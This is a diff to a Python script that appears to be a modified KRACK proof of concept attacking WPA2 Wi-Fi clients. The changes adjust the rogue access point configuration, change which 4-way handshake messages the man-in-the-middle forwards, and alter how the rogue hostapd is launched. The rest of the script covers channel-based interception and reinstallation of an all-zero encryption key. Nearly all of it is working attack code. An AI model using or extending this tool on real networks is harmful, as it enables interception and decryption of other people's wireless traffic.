@@ -329,8 +329,11 @@ wpa={wpaver}
 wpa_key_mgmt={akms}
 wpa_pairwise={pairwise}
 rsn_pairwise={pairwise}
+rsn_ptksa_counters={ptksa_counters}
+rsn_gtksa_counters={gtksa_counters}
 
 wmm_enabled={wmmenabled}
+wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
 wpa_passphrase={password}"""
@@ -343,12 +346,11 @@ wpa_passphrase={password}"""
 			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
+			ptksa_counters = (self.capab & 0b001100) >> 2,
+			gtksa_counters = (self.capab & 0b110000) >> 4,
+			wmmadvertised = int(args.group),
 			wmmenabled = self.wmmenabled,
 			password = str(args.password))
-	
-			# ptksa_counters = (self.capab & 0b001100) >> 2,
-			# gtksa_counters = (self.capab & 0b110000) >> 4,
-			# wmmadvertised = int(args.group),
 
 class ClientState():
 	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
@@ -398,7 +400,7 @@ class ClientState():
 			# Forwarding rules when attacking the 4-way handshake
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-				# 四次交握不轉送 msg4
+				# 四次交握不轉送 msg2 & msg4
 				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
 
@@ -658,12 +660,12 @@ class KRAckAttack():
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
 					# !-- CHECK[y]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
-					# !-- CHECK[ ]: 還是forward了
+					# !-- CHECK[ ]: time out problem?
 					if self.handle_to_client_pairwise(client, p):
-						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing")
+						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
 					elif self.handle_to_client_groupkey(client, p):
-						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing")
+						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
@@ -836,7 +838,7 @@ class KRAckAttack():
 		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
-		self.hostapd = subprocess.Popen("hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
